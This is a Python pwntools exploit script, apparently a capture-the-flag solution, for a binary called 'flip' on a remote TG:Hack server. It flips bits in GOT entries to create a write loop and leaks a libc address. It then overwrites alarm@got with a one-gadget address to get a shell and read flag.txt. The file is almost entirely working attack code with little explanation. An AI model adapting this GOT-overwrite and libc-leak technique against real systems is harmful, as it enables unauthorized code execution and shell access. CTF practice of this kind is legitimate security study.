

from pwn import *
import time

def flipbits(addr, orig, new, mask=0xFFFFFFFFF):
	to_flip = (orig ^ new) & mask;
	instructions = []
	for b in range(0, 8):
		for i in range(0,8):
			if to_flip & (1 << (i + (8*b))):
				instructions.append('0x{0:X}:{1}'.format(addr + b,i))
			
	return instructions


"""
r= gdb.debug('./flip',"""
#	break *initialize+92
#	command 
#	x/xg &'alarm@got.plt'
#	x/xg &'exit@got.plt'
#	x/xg &'__stack_chk_fail@got.plt'
#	end
#	continue""")
#"""
r=remote('flip.tghack.no',1947)

#Get infinit write Big Loop
r.sendline('0x601068:1')
r.sendline('0x601068:2')
r.sendline('0x601068:4')

#Start change of __stack_chk_fail@got.plt
r.sendline('0x601030:1')
r.sendline('0x601030:2')

print("Sent First stage of loop change")
r.sendline('0x601030:4')
r.sendline('0x601030:5')
r.sendline('0x601030:7')
r.sendline('0x601031:0')
r.sendline('0x601031:1')

print("Sent Second Stag of loop change")
r.sendline('0x601031:2')
r.sendline('0x601031:3')

#changes to smaller loop
print("Changing to smaller loop")
r.sendline('0x601068:7')
r.sendline('0x601069:0')
#forces exit
r.sendline('0x0:8')

LeakAddr = 0x601080

i = flipbits(LeakAddr,0x00400b51,0x00400b8a)
for x in i:
	r.sendline(x)
#Important that we know how may Writes we have left 
r.sendline('0x0:8')

#Changes back to biger loop trigger info leak
r.sendline('0x601068:7')
r.sendline('0x601069:0')
r.sendline('0x0:8')

#Wait for server
time.sleep(2)
Whatever = r.recv().split(" ")[::-1]
for i in Whatever:
	if "0x"in i:
		print("Got Memory Adress =%s"%i.split(':')[0])
		Whatever = int(i.split(':')[0],16)

#Change these for different versions of libc 
Alarm= Whatever-0x3092E0
print("Alarm =0x%x"%Alarm)
Gadget= Whatever-0x39E7FE 
print("Gadget=0x%x"%Gadget)

#Changes back to smaller loop

r.sendline('0x601068:7')
r.sendline('0x601069:0')
i = flipbits(0x601050,Alarm,Gadget)
for x in i:
	r.sendline(x)
r.sendline('0x0:8')
print("Finished sending payload")

#Trigger exploit by changing to bigger loop
r.sendline('0x601068:7')
r.sendline('0x601069:0')
#Padding
r.sendline('0x601030:4')
r.sendline('0x601030:5')
r.sendline('0x601030:7')

#Clean junk
r.clean()

#Get shell
r.sendline('id')
r.sendline('cat flag.txt')
r.interactive()
